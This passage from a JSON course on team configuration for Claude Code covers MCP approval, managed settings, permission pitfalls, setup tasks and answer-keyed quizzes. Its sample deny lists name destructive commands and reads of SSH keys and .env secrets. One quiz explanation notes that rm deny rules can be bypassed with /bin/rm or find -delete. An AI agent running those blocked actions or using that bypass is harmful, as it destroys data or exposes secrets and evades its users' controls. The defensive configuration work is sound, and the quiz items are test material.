accepts `streamable-http` as an alias for `http` (matching the MCP specification's name for this transport).\n\n## Environment variable expansion\n\nThe `${VAR}` and `${VAR:-default}` syntax is supported in `command`, `args`, `env`, `url`, and `headers`. This is the correct way to handle secrets in team configs:\n\n- Commit the `.mcp.json` with `${DB_PASSWORD}` references\n- Each developer sets `DB_PASSWORD` in their shell environment or a gitignored `.env` file\n- The secret never touches the repo\n\nIf a required variable is not set and has no default, Claude Code fails to parse the config — fail-loud by design.\n\n## The one-time per-developer approval requirement\n\nProject-scoped servers from `.mcp.json` require a **one-time trust approval per developer** before they load. The first time a developer opens the project interactively, Claude Code prompts for approval, listing the servers and their commands. Declining prevents that server from loading; the choice is persisted.\n\nTo check status or reset choices:\n\n```bash\n# See status for all configured servers (pending servers show as ⏸ Pending approval)\nclaude mcp list\n\n# Get details for a specific server\nclaude mcp get <name>\n\n# Reset approval choices (prompts again on next launch)\nclaude mcp reset-project-choices\n```\n\nThis is a security gate: a malicious repo cannot silently install MCP servers that connect to arbitrary endpoints without the developer explicitly approving them.\n\n## Adding a project-scoped server via CLI\n\n```bash\n# HTTP server — writes to .mcp.json at project root\nclaude mcp add --transport http payroll --scope project https://mcp.payroll.internal.example.com/mcp\n\n# stdio server with secrets in env\nclaude mcp add --env DB_URL=\"${DATABASE_URL}\" --transport stdio db-tools --scope project -- /usr/local/bin/db-mcp\n```\n\nFor stdio servers, the `--` (double dash) separates Claude Code's own flags from the command and arguments that run the server.\n\n## Managed MCP control\n\nFor organizations that need to restrict which MCP servers teams can use:\n\n```json\n// /etc/claude-code/managed-settings.json\n{\n  \"allowedMcpServers\": [\n    { \"serverName\": \"internal-db\" },\n    { \"serverName\": \"sentry\" }\n  ],\n  \"allowManagedMcpServersOnly\": true\n}\n```\n\nWith `allowManagedMcpServersOnly: true`, only servers in the managed `allowedMcpServers` list are respected — project `.mcp.json` entries for unlisted servers are ignored. `deniedMcpServers` still merges from all scopes even when this flag is set."
   },
   {
    "heading": "Managed settings: the org-wide enforcement layer",
    "body": "Managed settings are the only layer that **cannot be overridden** — not by project settings, not by local settings, not by CLI flags. They are deployed by IT/DevOps via MDM, configuration management, or a filesystem drop, not committed to any application repository.\n\n## Delivery mechanisms\n\n```\n# Single file\n/etc/claude-code/managed-settings.json          # Linux/WSL\n/Library/Application Support/ClaudeCode/managed-settings.json  # macOS\nC:\\Program Files\\ClaudeCode\\managed-settings.json              # Windows\n\n# Drop-in directory (base file merged first, then *.json alphabetically)\n/etc/claude-code/managed-settings.d/\n  10-telemetry.json\n  20-security.json\n  30-mcp-policy.json\n```\n\nFiles starting with `.` in the drop-in directory are ignored. Scalars in later files override earlier ones; arrays are concatenated and deduplicated; objects are deep-merged.\n\n## What belongs in managed settings vs managed CLAUDE.md\n\n| Concern | Managed settings | Managed CLAUDE.md |\n|---|---|---|\n| Block specific tools or file paths | `permissions.deny` | No |\n| Prevent `bypassPermissions` mode | `permissions.disableBypassPermissionsMode: \"disable\"` | No |\n| Force login org | `forceLoginOrgUUID` (string UUID or array of UUIDs) | No |\n| Restrict which MCP servers can be used | `allowedMcpServers`, `allowManagedMcpServersOnly` | No |\n| Code style and quality reminders | No | Yes |\n| Data handling compliance reminders | No | Yes |\n| Behavioral guidance for Claude | No | Yes |\n\n## Minimal team managed settings\n\n```json\n// /etc/claude-code/managed-settings.json\n{\n  \"permissions\": {\n    \"deny\": [\n      \"Bash(rm -rf *)\",\n      \"Bash(git push --force *)\",\n      \"Read(//etc/**)\",\n      \"Read(~/.ssh/**)\"\n    ],\n    \"disableBypassPermissionsMode\": \"disable\"\n  },\n  \"allowedMcpServers\": [\n    { \"serverName\": \"internal-db\" },\n    { \"serverName\": \"sentry\" },\n    { \"serverName\": \"github-api\" }\n  ],\n  \"allowManagedMcpServersOnly\": true,\n  \"forceLoginOrgUUID\": \"your-org-uuid-here\"\n}\n```\n\n## Embedding CLAUDE.md content in managed settings\n\nThe `claudeMd` key allows putting managed CLAUDE.md instructions directly inside `managed-settings.json` rather than deploying a separate file. It is **only honored in managed settings** — setting `claudeMd` in user, project, or local settings has no effect:\n\n```json\n{\n  \"claudeMd\": \"Always run `make lint` before committing.\\nNever push directly to main.\\nFollow the security checklist in SECURITY.md before any external API integration.\"\n}\n```\n\n## Error handling for invalid managed entries\n\nManaged settings parse tolerantly: invalid entries are stripped with warnings while valid policies still enforce. Claude Code does not fail completely on a single typo. However, security-critical fields have field-specific behavior when invalid:\n\n| Field | Behavior when invalid |\n|---|---|\n| `allowedMcpServers` | Enforced as empty allowlist; individual invalid entries stripped |\n| `allowManagedMcpServersOnly` | Treated as `true` |\n| `forceLoginOrgUUID` | No login permitted until fixed |\n| `deniedMcpServers` | Individual invalid entries stripped |\n\nValidation errors appear in startup dialogs, stderr (in `-p` mode), and `claude doctor`."
   },
   {
    "heading": "Complete team file layout",
    "body": "Putting the pieces together, here is the full directory layout for a team repo configured for shared Claude Code infrastructure:\n\n```\nacme-monorepo/\n  CLAUDE.md                    # project instructions (committed)\n  CLAUDE.local.md              # personal local overrides (gitignored)\n  .mcp.json                    # team MCP servers (committed)\n  .gitignore                   # includes CLAUDE.local.md and settings.local.json\n\n  .claude/\n    settings.json              # team permissions, hooks (committed)\n    settings.local.json        # personal model/memory prefs (gitignored)\n    rules/\n      testing.md               # loads every session\n      api-design.md            # loads every session\n      frontend/\n        react-patterns.md      # paths: [\"src/frontend/**/*.tsx\"]\n        css-conventions.md     # paths: [\"src/frontend/**/*.css\"]\n      backend/\n        db-patterns.md         # paths: [\"src/backend/db/**\"]\n    skills/\n      deploy-runbook.md        # loads only when invoked\n      pr-review.md             # loads only when invoked\n\n  services/\n    billing/\n      CLAUDE.md                # billing-specific instructions (committed)\n                               # loaded on demand when working in services/billing/\n    auth/\n      CLAUDE.md                # auth-specific instructions (committed)\n\n~/.claude/\n  settings.json               # user-level defaults\n  CLAUDE.md                   # cross-project personal preferences\n  rules/\n    personal-style.md         # applies to all projects\n  projects/\n    acme-monorepo/memory/\n      MEMORY.md               # auto memory (machine-local, not committed)\n      debugging.md\n\n/etc/claude-code/             # IT-managed (not in any repo)\n  managed-settings.json\n  CLAUDE.md\n```\n\n## .gitignore additions\n\n```\n# .gitignore\nCLAUDE.local.md\n.claude/settings.local.json\n```\n\n## What each committed file does\n\n| File | Purpose | Who edits it |\n|---|---|---|\n| `CLAUDE.md` | Project-wide session instructions | Team, reviewed in PRs |\n| `.mcp.json` | Approved MCP servers for all devs | Platform team |\n| `.claude/settings.json` | Team permission rules and hooks | Platform team |\n| `.claude/rules/*.md` | Topic-specific or path-scoped rules | Team leads |\n| `services/billing/CLAUDE.md` | Billing-service-specific rules | Billing team |"
   },
   {
    "heading": "Common pitfalls and failure modes",
    "body": "These are the failure modes seen most frequently when teams first set up shared Claude Code infrastructure.\n\n### 1. Using CLAUDE.md for enforcement\n\n**Symptom**: \"We told Claude in CLAUDE.md to never touch `.env` files, and it did anyway.\"\n\n**Root cause**: CLAUDE.md is context delivered as a user message, not a hard constraint. The model may decide differently based on conversation context.\n\n**Fix**: Add `\"Read(./.env)\"` and `\"Read(./.env.*)\"` to `permissions.deny` in `.claude/settings.json`. Now it is enforced by the client process, not by Claude's decision.\n\n### 2. Deny + allow = allow (wrong assumption)\n\n**Symptom**: \"We added `Bash(aws *)` to deny and `Bash(aws s3 ls)` to allow for the read-only case, and Claude still can't run `aws s3 ls`.\"\n\n**Root cause**: Deny always wins. Evaluation order is deny → ask → allow, and specificity does not change the order. A matching deny blocks the call regardless of any allow rule.\n\n**Fix**: Don't try to create deny-with-exceptions using allow rules. Structure deny rules to be precisely scoped. If you want to allow `aws s3 ls` and deny everything else, write narrow deny rules for the specific commands you want blocked.\n\n### 3. Committing secrets via settings.local.json\n\n**Symptom**: API key appears in git history.\n\n**Root cause**: Developer put a personal API key in `.claude/settings.local.json` and forgot to gitignore it.\n\n**Fix**: `.claude/settings.local.json` must be in `.gitignore` — enforce this at repo setup. Never put secret values in any settings file; use shell environment variables and reference them via `${VAR}` in `.mcp.json`.\n\n### 4. CLAUDE.md context dilution from large files or imports\n\n**Symptom**: Claude stops following some rules from CLAUDE.md as the project grows.\n\n**Root cause**: File exceeds 200 lines, or many `@import` statements pull in large files, consuming context budget and reducing adherence. Importing files does not reduce context — they load at launch the same as inline content.\n\n**Fix**: Move infrequently-needed content to path-scoped rules (`.claude/rules/` with `paths:` frontmatter) or to skills. Keep the base CLAUDE.md under 200 lines.\n\n### 5. Path anchor confusion: `/path` is not absolute\n\n**Symptom**: `Read(/etc/passwd)` deny rule does not block reads of `/etc/passwd`.\n\n**Root cause**: `/path` in permission rules means relative to the **project root**, not the filesystem root. `/etc/passwd` in a rule means `<project-root>/etc/passwd`.\n\n**Fix**: Use `//etc/passwd` (double slash prefix) for filesystem-absolute paths.\n\n### 6. Bash compound command behavior\n\n**Symptom**: Developer expects `Bash(safe-cmd *)` to let Claude run `safe-cmd && dangerous-cmd`.\n\n**Root cause**: Claude Code splits compound commands on `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. Each subcommand is checked independently against permission rules. `safe-cmd && dangerous-cmd` requires both subcommands to independently match an allow rule.\n\n**This is a feature** — it prevents sneaking a disallowed subcommand through a compound. When you approve a compound command interactively with \"Yes, don't ask again\", Claude Code saves a separate rule for each subcommand.\n\n### 7. Nested CLAUDE.md not surviving /compact\n\n**Symptom**: After `/compact`, Claude loses knowledge of conventions in `services/billing/CLAUDE.md`.\n\n**Root cause**: Project-root CLAUDE.md re-injects after compaction; nested subdirectory CLAUDE.md files only reload when Claude next touches a file in that subdirectory.\n\n**Fix**: Put the most critical cross-session invariants in the project-root CLAUDE.md. Subdirectory-specific content in nested files will need to reload.\n\n### 8. MCP server silently not loading\n\n**Symptom**: Team deploys `.mcp.json` but a developer reports the MCP tools aren't available.\n\n**Root cause**: The developer never saw (or declined) the one-time approval dialog.\n\n**Fix**: Run `claude mcp list` to check status. Servers pending approval show as `⏸ Pending approval`. Run Claude interactively to trigger the approval dialog, or run `claude mcp reset-project-choices` to re-prompt.\n\n### 9. `*` in Read/Edit path rules does not span directories\n\n**Symptom**: `Read(src/*.ts)` was expected to match `src/api/handler.ts` but doesn't.\n\n**Root cause**: In Read/Edit/Write path rules, `*` follows gitignore semantics and matches within a single path segment only. It does not cross directory separators.\n\n**Fix**: Use `**` to match across directories: `Read(src/**/*.ts)` matches TypeScript files at any depth under `src/`."
   },
   {
    "heading": "Quick-start checklist for a new team repo",
    "body": "Use this as a setup checklist when onboarding a new shared repository:\n\n```\n[ ] Create CLAUDE.md at project root\n    - Build commands, test commands\n    - Coding standards specific to this repo\n    - Architectural decisions Claude needs to know\n    - Under 200 lines; use path-scoped rules for larger content\n\n[ ] Create .claude/settings.json (committed)\n    - Add allow rules for CI-safe Bash commands (npm, git read-only)\n    - Add deny rules for destructive operations\n    - Add deny rules for sensitive files (.env, secrets/)\n    - Add hooks if needed (PreCommit, etc.)\n\n[ ] Create .claude/settings.local.json.example (optional but helpful)\n    - Template showing personal settings fields with comments\n    - Developers copy it as a starting point (it is gitignored itself)\n\n[ ] Add to .gitignore:\n    CLAUDE.local.md\n    .claude/settings.local.json\n\n[ ] Create .mcp.json if the team uses shared MCP servers\n    - Use ${VAR} references for all credentials\n    - Document required env vars in CLAUDE.md or project README\n\n[ ] Add path-scoped rules in .claude/rules/ for large codebases\n    - frontend.md with paths: [\"src/frontend/**\"]\n    - api.md with paths: [\"src/api/**\"]\n\n[ ] Deploy managed-settings.json via MDM/Ansible/Puppet (if org-level control needed)\n    - deny rules that must never be overridden\n    - MCP server allowlist\n    - disableBypassPermissionsMode\n\n[ ] Test: run /memory in a session and verify the right CLAUDE.md files load\n[ ] Test: attempt a denied Bash command and verify it is blocked\n[ ] Test: verify .mcp.json servers appear in `claude mcp list`\n[ ] Test: verify a project-scoped MCP server prompts for approval on first run\n```"
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your team commits `.claude/settings.json` and `.mcp.json` to the repo. A developer reports that MCP servers from `.mcp.json` are not loading. What is the most likely cause?",
    "options": [
     "`.mcp.json` must be listed under `permissions.allow` in `.claude/settings.json` before it activates.",
     "`.mcp.json` was placed inside `.claude/` rather than the repository root.",
     "MCP servers require an entry in `~/.claude.json` to activate for any project.",
     "`.mcp.json` tool schemas load eagerly and crash if the server is not running."
    ],
    "correct": 1,
    "sectionIndices": [
     0,
     12
    ],
    "explanation": "`.mcp.json` must sit at the repository root. Placing it under `.claude/` or in Claude Desktop format means it is never loaded. Tool schemas are deferred and load on demand, so an unreachable server does not prevent loading."
   },
   {
    "prompt": "You launch Claude Code from `/home/alice/projects/webapp/src`. Which CLAUDE.md files are loaded into context at startup?",
    "options": [
     "Only `/home/alice/projects/webapp/src/CLAUDE.md` (the immediate cwd file).",
     "All CLAUDE.md files found by walking UP the directory tree from cwd, plus `~/.claude/CLAUDE.md`, concatenated root-down.",
     "All CLAUDE.md files in the entire repository tree, including subdirectories below cwd.",
     "`~/.claude/CLAUDE.md` only — project CLAUDE.md files require `/init` to activate."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "Discovery walks UP from cwd, loading every CLAUDE.md and CLAUDE.local.md found on the way. Subdirectory CLAUDE.md files (below cwd) are NOT loaded at launch — they load on demand only when Claude reads a file in that subdirectory."
   },
   {
    "prompt": "A teammate edits the project CLAUDE.md to add a critical instruction. After a `/compact`, Claude ignores the instruction for a file deep in `src/auth/`. What is happening?",
    "options": [
     "Project CLAUDE.md is evicted from context by `/compact` and must be reloaded with `/memory`.",
     "The instruction is in `src/auth/CLAUDE.md` (a nested subdirectory), which does not re-inject after `/compact` — it only reloads when Claude next reads a file there.",
     "CLAUDE.md instructions are converted to auto-memory entries by `/compact` and lose their project scope.",
     "`/compact` merges all CLAUDE.md files into one flat summary; nested instructions are lost permanently."
    ],
    "correct": 1,
    "sectionIndices": [
     8
    ],
    "explanation": "Project-root CLAUDE.md survives `/compact` (re-read from disk and re-injected). Nested subdirectory CLAUDE.md files are NOT re-injected — they only reload on the next file read in that subdirectory. Instructions that must survive compaction must live in the root CLAUDE.md."
   },
   {
    "prompt": "Your `.claude/rules/frontend.md` has a `paths: src/**/*.{ts,tsx}` frontmatter glob. A developer adds a new rule for database migrations to the same file. What happens?",
    "options": [
     "The migration rule also loads only when Claude reads a `.ts` or `.tsx` file, regardless of what it governs.",
     "The `paths:` glob is ignored once more than one rule is in a file; all rules load at session start.",
     "Claude loads the file eagerly because it detects a conflict between the migration context and the TypeScript glob.",
     "Rules files with `paths:` frontmatter are skipped if they contain mixed domain content."
    ],
    "correct": 0,
    "sectionIndices": [
     4
    ],
    "explanation": "The `paths:` frontmatter controls loading of the entire rules file, not individual rules inside it. Everything in `frontend.md` loads only when Claude reads a matching `.ts`/`.tsx` file — including the unrelated migration rule."
   },
   {
    "prompt": "Your team uses `@~/projects/shared-standards.md` inside the project CLAUDE.md to import shared guidelines. A junior developer opens a Claude Code session from a git worktree. Which of the following is true?",
    "options": [
     "The import expands `~/` relative to the worktree root, so it resolves to a different file per worktree.",
     "The import does NOT save context tokens — the full contents of `shared-standards.md` expand inline at launch.",
     "The import is silently skipped in worktrees because CLAUDE.md imports require the original clone directory.",
     "Imports from `~/` paths trigger the approval dialog on every session in a new worktree."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "Imports do NOT save context — imported files fully expand into context at launch. Only path-scoped rules defer loading. The `~/` path resolves to the user's home directory, not the worktree root, so the same file is used everywhere."
   },
   {
    "prompt": "Your org deploys `managed-settings.json` with `permissions.deny: ['Bash(rm -rf *)']` to prevent accidental deletions. A developer adds `permissions.allow: ['Bash(rm -rf *)']` to their `~/.claude/settings.json`. What happens?",
    "options": [
     "The user allow overrides the managed deny because user settings are more specific to that machine.",
     "The managed deny wins — `managed-settings.json` always wins over all other scopes, including CLI flags.",
     "Both rules coexist; the allow fires first because allow lists are checked before deny lists.",
     "The conflict is detected at startup and Claude asks the user to resolve it interactively."
    ],
    "correct": 1,
    "sectionIndices": [
     10,
     11
    ],
    "explanation": "Managed settings always win, even over CLI flags. The precedence is: managed deny > user/project deny > managed ask > user/project ask > managed allow > user/project allow. A managed deny cannot be overridden by a user allow at any scope."
   },
   {
    "prompt": "You add `Bash(npm run *)` to `permissions.allow` expecting it to cover `npm run test --watch`. A teammate reports Claude still prompts for the `--watch` variant. What is the cause?",
    "options": [
     "`*` in Bash patterns matches across multiple arguments, so `npm run *` should have worked — the issue is a settings file merge conflict.",
     "Bash permission patterns match the literal command string component-by-component; `*` matches a single component, not additional arguments, so `--watch` is a separate component not covered.",
     "npm commands require an additional `npm(*)` permission in addition to `Bash(npm run *)` to authorize subcommands.",
     "`permissions.allow` applies only to Claude-initiated commands; user-typed commands in the terminal always prompt."
    ],
    "correct": 1,
    "sectionIndices": [
     11
    ],
    "explanation": "`*` matches a single path/command component. `Bash(npm run *)` covers `npm run test` but NOT `npm run test --watch` because `--watch` is an additional argument beyond the single wildcard. You need `Bash(npm run test *)` or a broader pattern."
   },
   {
    "prompt": "A developer adds `permissions: { allow: ['Bash(git status)'] }` to `~/.claude.json` to authorize a git command globally. Claude continues to prompt. Why?",
    "options": [
     "`~/.claude.json` is not a settings file — it stores app state, OAuth, and UI toggles. `permissions` keys there are silently ignored; the entry belongs in `~/.claude/settings.json`.",
     "`~/.claude.json` only accepts `deny` entries; allow rules must go in `.claude/settings.json` at the project level.",
     "Global allow rules require a `scope: global` field inside `~/.claude.json` to be recognized.",
     "`Bash(git status)` is a built-in safe command; permission rules for it are silently discarded."
    ],
    "correct": 0,
    "sectionIndices": [
     10
    ],
    "explanation": "`~/.claude.json` holds app state, theme, OAuth session, and MCP server entries — NOT permissions, hooks, or env. Putting `permissions` there is silently ignored. User-scoped permission rules belong in `~/.claude/settings.json`."
   },
   {
    "prompt": "A team member says 'I told Claude to always use pnpm instead of npm.' Claude followed this for one session, then forgot it. What most likely happened?",
    "options": [
     "The instruction was typed in conversation and saved to auto-memory (MEMORY.md). Auto-memory topic files only load on demand, not at startup — if it was put in a topic file rather than the first 200 lines of MEMORY.md, it was silently not loaded.",
     "Auto-memory is disabled by default and must be explicitly enabled per-project before session instructions persist.",
     "MEMORY.md entries are reset at the start of each git branch to avoid conflicts between branches.",
     "Session instructions typed as regular messages are saved to CLAUDE.md, but CLAUDE.md is not loaded after the first session."
    ],
    "correct": 0,
    "sectionIndices": [
     9
    ],
    "explanation": "Auto-memory MEMORY.md has a 200-line / 25KB cap at startup — only the first 200 lines load. Topic files (e.g. `pnpm.md`) load on demand, not at startup. If the pnpm preference was written to a topic file or beyond line 200, it silently fails to load."
   },
   {
    "prompt": "Your built-in Explore subagent is ignoring a critical `no-console.log` rule in the project CLAUDE.md. You verify the file is committed and loads correctly in the main session. What is the explanation?",
    "options": [
     "Built-in Explore and Plan subagents skip CLAUDE.md — you must restate critical instructions in the delegating prompt.",
     "Subagents load CLAUDE.md but only the first 50 lines to reduce context; the rule is beyond that cutoff.",
     "The Explore subagent applies user-level `~/.claude/CLAUDE.md` only, not project-level CLAUDE.md.",
     "Subagents inherit permissions from the parent session but receive a fresh context without any CLAUDE.md content."
    ],
    "correct": 0,
    "sectionIndices": [
     7
    ],
    "explanation": "Built-in Explore and Plan subagents explicitly skip CLAUDE.md. Critical instructions must be restated in the delegating prompt. Custom subagents defined in `.claude/agents/` do load CLAUDE.md like the main conversation."
   },
   {
    "prompt": "You commit `.claude/settings.json` with a new `hooks` entry. A teammate pulls the change but reports the hook is not firing. They tried restarting their terminal. What should they do?",
    "options": [
     "Run `/hooks` in Claude Code — if it shows stale definitions, run `/hooks` again, because env vars are read at startup but settings.json changes take effect after a file-stability delay with no restart needed.",
     "Restart the `claude` daemon service because hooks are compiled into a binary cache at startup.",
     "The hook is in project settings but hooks only fire when defined in user `~/.claude/settings.json`.",
     "Delete `.claude/settings.json.lock` — a stale lockfile prevents new hook definitions from loading."
    ],
    "correct": 0,
    "sectionIndices": [
     10
    ],
    "explanation": "settings.json edits take effect after a brief file-stability delay with no restart needed. If `/hooks` shows stale definitions, running `/hooks` again refreshes them. Note: env vars ARE read at startup only (restart required for those), but hooks in settings.json do not require a restart."
   },
   {
    "prompt": "Your monorepo has a top-level CLAUDE.md with org-wide rules and a `packages/payments/CLAUDE.md` with payment-team rules. A new engineer joins the payments team and wants to ignore the org-level CLAUDE.md to avoid noise. What is the correct approach?",
    "options": [
     "Add `claudeMdExcludes` globs in `packages/payments/.claude/settings.local.json` to skip the ancestor org CLAUDE.md.",
     "Rename the org-level CLAUDE.md to `.claude/CLAUDE.md` — files in `.claude/` are skipped by subdirectory sessions.",
     "Set `CLAUDE_CODE_DISABLE_CLAUDE_MDS=1` in their shell — this disables only the org-level file while keeping the payments CLAUDE.md.",
     "Add a `priority: low` frontmatter key to the org CLAUDE.md to mark it as advisory."
    ],
    "correct": 0,
    "sectionIndices": [
     6
    ],
    "explanation": "`claudeMdExcludes` (a string array of globs in settings) skips loading ancestor CLAUDE.md/rules files matched by the glob. Using `settings.local.json` keeps it personal and gitignored. `CLAUDE_CODE_DISABLE_CLAUDE_MDS=1` disables ALL CLAUDE.md files — including the payments one — which is too aggressive."
   }
  ],
  "tasks": [
   {
    "id": "stage-1-task-team-settings",
    "afterSectionIdx": 0,
    "title": "Bootstrap team config files for your project",
    "instructions": "Create the three source-controlled config files every team project should have.\n\n1. Create `.claude/settings.json` at your project root with a minimal permission allow-list:\n```bash\nmkdir -p .claude\ncat > .claude/settings.json << 'EOF'\n{\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(npm run *)\",\n      \"Bash(git status)\",\n      \"Bash(git diff *)\",\n      \"Bash(git log *)\"\n    ],\n    \"deny\": [\n      \"Bash(rm -rf *)\",\n      \"Read(./.env*)\",\n      \"Read(./secrets/**)\"\n    ]\n  }\n}\nEOF\n```\n2. Create `.mcp.json` at the **repository root** (not inside `.claude/`):\n```bash\ncat > .mcp.json << 'EOF'\n{\n  \"mcpServers\": {}\n}\nEOF\n```\n3. Add `settings.local.json` to `.gitignore` so personal overrides stay off the repo:\n```bash\necho '.claude/settings.local.json' >> .gitignore\necho 'CLAUDE.local.md' >> .gitignore\n```\n4. Open Claude Code, run a bash command (e.g. `git status`), and confirm it runs without a permission prompt.",
    "doneWhen": "`.claude/settings.json` and `.mcp.json` exist in your repo, `settings.local.json` and `CLAUDE.local.md` are in `.gitignore`, and `git status` runs inside Claude Code without a permission prompt."
   },
   {
    "id": "stage-1-task-claude-md",
    "afterSectionIdx": 2,
    "title": "Write a lean, effective CLAUDE.md for your project",
    "instructions": "Create or update your project's `CLAUDE.md` following the authoring guidelines.\n\n1. Open (or create) `CLAUDE.md` in your project root.\n2. Add the following sections, filling in real values for your project:\n```markdown\n# <Project Name>\n\n## Commands\n- Build: `npm run build`\n- Test: `npm test`\n- Lint: `npm run lint`\n- Type-check: `npx tsc --noEmit`\n\n## Architecture\n- Source lives in `src/`; API handlers in `src/api/`\n- Config files in `config/`; never hardcode environment values\n\n## Rules\n- Use 2-space indentation (TypeScript/JS)\n- Run `npm test` before committing\n- Never commit `.env` or files containing secrets\n- All new functions require a JSDoc comment explaining *why*, not just what\n```\n3. Keep the file under 200 lines. If it grows, move task-specific content to `.claude/rules/<topic>.md`.\n4. Start a new Claude Code session and verify Claude references your build command correctly when asked how to build the project.",
    "doneWhen": "`CLAUDE.md` exists at the project root, is under 200 lines, and Claude answers 'how do I build this project?' using the command you defined without being told separately."
   },
   {
    "id": "stage-1-task-path-scoped-rule",
    "afterSectionIdx": 4,
    "title": "Add a path-scoped rule that loads only for relevant files",
    "instructions": "Create a path-scoped rule so Claude gets extra instructions only when working with a specific file type.\n\n1. Create the rules directory and a new rule file:\n```bash\nmkdir -p .claude/rules\ncat > .claude/rules/api-handlers.md << 'EOF'\n---\npaths:\n  - src/api/**/*.ts\n---\n\n# API Handler Rules\n- Every handler must validate input with Zod before processing\n- Return typed responses using the shared `ApiResponse<T>` wrapper from `src/types/api.ts`\n- Log all errors with `logger.error()` including the request trace ID\n- Never return raw database objects — map to a DTO first\nEOF\n```\n2. Create a test file at `src/api/test-handler.ts` (can be empty):\n```bash\nmkdir -p src/api\ntouch src/api/test-handler.ts\n```\n3. In a Claude Code session, ask Claude to create an API handler in `src/api/test-handler.ts`. Confirm it mentions Zod validation and the `ApiResponse<T>` wrapper — guidance it would only have if the path-scoped rule loaded.\n4. Then ask Claude to create a utility function in `src/utils/math.ts` and confirm it does NOT reference API-specific rules (the path-scoped rule should not have loaded for that path).",
    "doneWhen": "`.claude/rules/api-handlers.md` exists with a `paths:` frontmatter glob, and Claude applies the API rules when editing a file under `src/api/` but not when editing a file outside that path."
   }
  ],
  "visualizations": [
   {
    "id": "stage-1-v",
    "kind": "comparison-table",
    "title": "Config & memory (CLAUDE.md, settings)",
    "textualSummary": "Key concepts of Config & memory (CLAUDE.md, settings): CLAUDE.md memory files, guidance vs enforcement, settings precedence and merging.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "CLAUDE.md memory files",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "guidance vs enforcement",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "settings precedence and merging",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "committed vs personal config scope",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Config & memory (CLAUDE.md, settings).",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-1-q1",
    "type": "multiple-choice",
    "prompt": "Your team commits `.claude/settings.json` with `permissions.allow: [\"Bash(npm run test *)\"]`. A teammate later adds `permissions.allow: [\"Bash(npm run lint *)\"]` to their personal `~/.claude/settings.json`. When your teammate runs Claude, which permissions are in effect?",
    "options": [
     "Only the project `.claude/settings.json` allow list, because project settings override user settings.",
     "Only the user `~/.claude/settings.json` allow list, because personal settings take highest priority.",
     "Both allow lists are combined — the teammate can run both `npm run test *` and `npm run lint *`.",
     "Whichever file was loaded last wins; the result depends on directory traversal order."
    ],
    "correct": 2,
    "explanation": "Array settings like `permissions.allow` merge across all scopes rather than replacing each other. The teammate ends up with both entries active. Option A is wrong because the content states that array settings 'combine across all scopes' — there is no winner-takes-all replacement for arrays. Option B is wrong for the same reason; user settings have lower precedence for scalar values, but array settings accumulate. Option D is wrong because merge behavior is deterministic by scope, not by load order."
   },
   {
    "id": "stage-1-q2",
    "type": "multiple-choice",
    "prompt": "A security-conscious team wants to guarantee that Claude never runs `rm -rf *` regardless of what individual developers add to their personal or project allow lists. They add `Bash(rm -rf *)` to `permissions.deny` in `.claude/settings.json`. Is this sufficient?",
    "options": [
     "Yes — deny always beats allow across all scopes, so this blocks the command everywhere.",
     "No — project deny rules can be overridden by a higher-precedence local `settings.local.json` allow.",
     "No — `Bash(rm -rf *)` matches the literal string, not the executable, so `/bin/rm` or `find -delete` are not blocked; use a PreToolUse hook or sandbox instead.",
     "No — deny rules in `.claude/settings.json` only apply to interactive sessions, not headless `claude` invocations."
    ],
    "correct": 2,
    "explanation": "The content explicitly warns that 'Bash prefix deny rules are not a hard guarantee — `Bash(rm *)` matches the literal string, NOT the executable, so it doesn't block `/bin/rm` or `find -delete`. For a real block use a PreToolUse hook or the sandbox.' Option A is true that deny beats allow, but that does not solve the bypass via different executables or tools. Option B is wrong — managed deny beats everything, and local allow cannot override a deny from any scope. Option D invents a distinction not present in the content."
   },
   {
    "id": "stage-1-q3",
    "type": "multiple-choice",
    "prompt": "A developer places `.mcp.json` inside the `.claude/` directory (i.e., `.claude/.mcp.json`) to keep it alongside other Claude config. After restarting Claude, the MCP servers defined there never appear. What went wrong?",
    "options": [
     "The file must be named `mcp-servers.json`, not `.mcp.json`.",
     "`.mcp.json` must be at the repo root — placing it under `.claude/` means it never loads.",
     "The developer forgot to run `claude mcp add` after creating the file.",
     "MCP server tool schemas are deferred and require a tool search before they appear."
    ],
    "correct": 1,
    "explanation": "The content states: '`.mcp.json` **must be at repo root** — placing it under `.claude/` or in Claude Desktop format **never loads**.' The file location is the issue. Option A is wrong — the file name `.mcp.json` is correct per the content. Option C is wrong — `claude mcp add` is for user-scope personal servers, not the team `.mcp.json` file. Option D describes a real behavior (tool schemas are deferred) but that would cause them to appear after a tool search, not to never appear at all — the question says they 'never appear', pointing to a loading failure."
   },
   {
    "id": "stage-1-q4",
    "type": "multiple-choice",
    "prompt": "Your team's CLAUDE.md has grown to 350 lines. A teammate argues the file is fine because 'Claude loads the full file regardless of length.' You argue it still needs to be trimmed. Who is correct, and why?",
    "options": [
     "The teammate is correct — since CLAUDE.md loads in full, length has no effect on Claude's behavior.",
     "You are correct — files over 200 lines are truncated before injection, so instructions past line 200 are silently dropped.",
     "You are correct — while the file does load in full, longer files reduce adherence, meaning Claude follows the instructions less reliably.",
     "The teammate is correct for project CLAUDE.md but wrong for `~/.claude/CLAUDE.md`, which is capped at 25 KB."
    ],
    "correct": 2,
    "explanation": "The content states: 'Keep under ~200 lines: longer files still load fully but **reduce adherence**.' So the teammate is wrong that length doesn't matter, but you are also wrong if you claim truncation occurs — it doesn't. The 200-line cap applies to auto-memory MEMORY.md, not to CLAUDE.md. Option B confuses the MEMORY.md 200-line cap with CLAUDE.md behavior. Option D invents a distinction that doesn't appear in the content."
   },
   {
